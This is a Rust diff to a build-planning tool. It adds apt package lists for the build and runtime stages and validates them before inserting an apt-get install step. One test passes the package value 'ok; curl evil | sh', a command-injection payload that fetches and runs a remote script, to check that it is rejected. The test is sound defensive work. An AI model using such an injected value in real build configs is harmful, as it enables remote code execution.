@@ -26,6 +26,10 @@ pub struct BuildOverrides {
     pub port: Option<u16>,
     /// Environment variables to set in the runtime image.
     pub env: std::collections::BTreeMap<String, String>,
+    /// Apt packages to install in the build stage.
+    pub build_apt_packages: Vec<String>,
+    /// Apt packages to install in the final runtime image.
+    pub deploy_apt_packages: Vec<String>,
 }
 
 /// Context for a project being analyzed.
@@ -129,6 +133,8 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
     let forced_provider = overrides.provider.clone();
     let port_override = overrides.port;
     let env = overrides.env.clone();
+    let build_apt = overrides.build_apt_packages.clone();
+    let deploy_apt = overrides.deploy_apt_packages.clone();
     let ctx = AppContext::with_overrides(root, overrides)?;
 
     let mut plan = if let Some(name) = forced_provider {
@@ -154,8 +160,45 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
         plan.port = Some(port);
     }
     plan.env = env;
+    apply_apt_packages(&mut plan, &build_apt, &deploy_apt)?;
 
     Ok(plan)
+}
+
+/// Install user-requested apt packages: build packages in the first stage,
+/// runtime packages in the last stage. Each is validated, then prepended as a
+/// single `apt-get install` step so it layers ahead of the provider's own build
+/// commands. A no-op when both lists are empty.
+fn apply_apt_packages(plan: &mut BuildPlan, build: &[String], deploy: &[String]) -> Result<()> {
+    if !build.is_empty() {
+        let command = apt_command(build)?;
+        if let Some(stage) = plan.stages.first_mut() {
+            stage.commands.insert(0, command);
+        }
+    }
+    if !deploy.is_empty() {
+        let command = apt_command(deploy)?;
+        if let Some(stage) = plan.stages.last_mut() {
+            stage.commands.insert(0, command);
+        }
+    }
+    Ok(())
+}
+
+/// Build the validated `apt-get install` command for a package list. `update`
+/// and `rm -rf /var/lib/apt/lists/*` bracket the install so the layer is
+/// self-contained and leaves no apt index behind.
+fn apt_command(packages: &[String]) -> Result<crate::plan::Command> {
+    for package in packages {
+        crate::sanitize::validate_apt_package(package)?;
+    }
+    let list = packages.join(" ");
+    Ok(crate::plan::Command {
+        run: format!(
+            "apt-get update && apt-get install -y --no-install-recommends {list} && rm -rf /var/lib/apt/lists/*"
+        ),
+        cache_mounts: vec!["/var/cache/apt".to_string()],
+    })
 }
 
 /// Detect the project language without generating a plan.
@@ -212,5 +255,59 @@ mod tests {
         std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
         std::fs::write(dir.path().join("kiln.json"), r#"{"provider":"cobol"}"#).unwrap();
         assert!(detect_and_plan(dir.path()).is_err());
+    }
+
+    #[test]
+    fn config_installs_build_and_deploy_apt_packages() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(
+            dir.path().join("kiln.json"),
+            r#"{"build_apt_packages":["libpq-dev","pkg-config"],"deploy_apt_packages":["ca-certificates"]}"#,
+        )
+        .unwrap();
+        let plan = detect_and_plan(dir.path()).unwrap();
+
+        // build packages land as the first command of the first (build) stage
+        let build_cmd = &plan.stages.first().unwrap().commands[0].run;
+        assert!(
+            build_cmd.contains("apt-get install -y --no-install-recommends libpq-dev pkg-config"),
+            "{build_cmd}"
+        );
+
+        // deploy packages land as the first command of the last (runtime) stage
+        let deploy_cmd = &plan.stages.last().unwrap().commands[0].run;
+        assert!(
+            deploy_cmd.contains("apt-get install -y --no-install-recommends ca-certificates"),
+            "{deploy_cmd}"
+        );
+    }
+
+    #[test]
+    fn apt_install_precedes_the_providers_own_build_command() {
+        // go's build stage runs `go build`; the apt step must be inserted ahead
+        // of it so system deps exist before the build runs.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(dir.path().join("kiln.json"), r#"{"build_apt_packages":["gcc"]}"#).unwrap();
+        let plan = detect_and_plan(dir.path()).unwrap();
+        let cmds = &plan.stages.first().unwrap().commands;
+        assert!(cmds[0].run.contains("apt-get install"));
+        assert!(cmds.iter().skip(1).any(|c| c.run.contains("go build")));
+    }
+
+    #[test]
+    fn malicious_apt_package_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(
+            dir.path().join("kiln.json"),
+            r#"{"build_apt_packages":["ok; curl evil | sh"]}"#,
+        )
+        .unwrap();
+        assert!(
+            detect_and_plan(dir.path()).is_err(),
+            "shell metachars in a package must be rejected"
+        );
     }
 }
